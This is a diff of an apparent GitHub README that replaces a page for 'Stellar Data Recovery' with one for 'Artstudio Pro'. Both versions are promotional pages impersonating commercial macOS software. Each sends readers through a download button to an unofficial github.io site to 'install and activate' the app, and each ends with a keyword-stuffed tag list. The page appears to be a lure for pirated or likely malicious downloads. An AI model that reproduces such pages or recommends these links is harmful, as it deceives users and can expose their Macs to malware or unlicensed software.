@@ -1,63 +1,63 @@
-# Stellar Data Recovery – Professional File Restoration Suite for macOS  
+# Artstudio Pro – Next-Generation Painting & Photo Editing App for macOS
 <div align="center">
-  <img src="https://sc.filehippo.net/images/t_app-icon-l/p/437f8346-96d6-11e6-917b-00163ed833e7/2804699152/stellar-windows-data-recovery-logo" width="250"/>
-</div>  
+  <img src="https://cdn.jim-nielsen.com/macos/512/artstudio-pro-desktop-2023-09-14.png?rf=1024" width="250"/>
+</div>
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/stellar">
-    <img src="https://img.shields.io/badge/Get%20Stellar%20Data%20Recovery-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Stellar Data Recovery">
+  <a href="https://osx-quick-app.github.io/.github/artstudio">
+    <img src="https://img.shields.io/badge/Get%20Artstudio%20Pro-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Artstudio Pro">
   </a>
 </p>
 
 ---
 
-# Installation Instructions  
+# Installation Instructions
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate Stellar Data Recovery On Your Mac Device.
+2. Follow The On-Screen Steps To Install And Activate Artstudio Pro On Your Mac Device.
 
 ---
 
 <div align="center">
-  <img src="https://www.pandorarecovery.com/wp-content/uploads/2021/12/stellar-data-recovery-file-types-settings-scaled.jpg" width="1080"/>
-</div>  
+  <img src="https://www.luckyclan.com/sites/default/files/styles/screen_ios/public/dasdas1a@2x.jpg?itok=M4Lyq-uQ" width="1080"/>
+</div>
 <br>
 
-## 💽 Overview  
-**Stellar Data Recovery** is a robust and reliable tool designed to recover accidentally deleted, lost, or formatted files on **macOS**.  
-It can restore data from internal system drives, external disks, SSDs, USB flash drives, and SD cards with precision and speed.  
+## 🎨 Overview
+**Artstudio Pro** is a powerful creative environment that blends digital painting and professional photo editing into one streamlined workspace.  
+Developed by *Lucky Clan*, it’s built for artists, illustrators, and designers who demand both speed and precision.  
 
-With a streamlined interface and powerful scan engine, it identifies and retrieves data that other utilities often miss.  
-Whether recovering critical work documents, cherished photos, or entire partitions, **Stellar** ensures your files are safe and recoverable.  
+The app comes packed with a rich set of professional-grade tools — from realistic brushes and texture dynamics to advanced layer management and non-destructive adjustments.  
+Whether you’re sketching concept art, refining photos, or building digital illustrations, **Artstudio Pro** adapts perfectly to your workflow.  
 
-Optimized for **Apple Silicon (M1/M2)**, the software provides lightning-fast scans and broad file system compatibility, including **APFS, HFS+, FAT, exFAT, and NTFS**.  
-
----
-
-## 🚀 Key Features  
-
-| Feature | Description |  
-|-------------------------------------|------------------------------------------------------------------------------|  
-| 🔍 **Advanced Scan Technology** | Performs deep scans to detect and restore lost or corrupted files with high accuracy. |  
-| 💾 **Wide File Support** | Recovers images, videos, emails, and documents from multiple file types. |  
-| 🧩 **Partition & Volume Recovery** | Retrieves data from deleted, hidden, or inaccessible drives. |  
-| 📱 **Device Compatibility** | Supports recovery from external drives, SD cards, and USB storage devices. |  
-| 🖼️ **Pre-Recovery Preview** | Review all detected files before restoration to ensure proper recovery. |  
-| ⚡ **Optimized for Modern Macs** | Native M1/M2 compatibility and optimized performance for macOS Ventura and newer. |  
+Fully optimized for **macOS** and **Apple Silicon (M1/M2)**, it delivers lightning-fast performance even on massive canvases, ensuring smooth, fluid brushwork and responsive editing at every step.
 
 ---
 
-## 💻 System Requirements  
+## 🚀 Key Features
 
-| Component | Minimum Specifications |  
-|---------------|-----------------------------------|  
-| OS | macOS 11.0 or later |  
-| Processor | Apple Silicon (M1/M2) or Intel |  
-| Memory | 4 GB RAM (8 GB recommended) |  
-| Storage | 500 MB of available space |  
-| Display | 1280×800 resolution or higher |  
+| Feature | Description |
+|-------------------------------------|------------------------------------------------------------------------------|
+| 🖌️ **Professional Brush Engine** | Create expressive strokes using over 100 customizable, pressure-sensitive brushes. |
+| 🧩 **Photoshop File Support (PSD)** | Open and export PSD files with full compatibility, including layers and blending modes. |
+| 🎛️ **Advanced Editing Tools** | Retouch images, apply filters, use adjustment layers, and manage masks effortlessly. |
+| ⚙️ **High-Performance Rendering** | Optimized for Apple Silicon to handle large files and complex compositions without lag. |
+| 🎨 **Non-Destructive Workflow** | Make edits freely while preserving original image quality. |
+| 💡 **Modern macOS Interface** | A clean, flexible workspace tailored for artists and designers alike. |
 
 ---
 
-## 🏷️ Tags  
-data recover • data recover mac • data recover for mac • recover deleted files • 4ddig • data recovery near me • ultdata • easeus data recovery wizard • easeus data recovery • recoverit • data recovery services • recoverit data recovery • photorec • file recovery • backup and restore • data recovery services near me • testdisk • minitool power data recovery • diskdigger • android data recovery • puran file recovery • external hard drive recovery • photo recovery
+## 💻 System Requirements
+
+| Component | Minimum Specifications |
+|---------------|-----------------------------------|
+| OS | macOS 11.0 or later |
+| Processor | Apple Silicon (M1/M2) or Intel |
+| Memory | 4 GB RAM (8 GB recommended) |
+| Storage | 1 GB free disk space |
+| Display | 1280×800 resolution or higher |
+
+---
+
+## 🏷️ Tags
+art studio • artstudio mac • artstudio • artstudio pro mac • artstudio pro • art studio near me • mosaic art studio • diamond art studio • chelsea art studio • the art studio • rent art studio • creative art studio • home art studio • mosaic art studio vancouver • fine art studio • wesley taylor art studio • 4 cat art studio • crayola glow art studio • art studio website • garden art studio • glow art studio • backyard art studio • mercado art studio • ultimate art studio • easely art studio • master's touch fine art studio • 3d art studio • pouring art studio • muse art studio
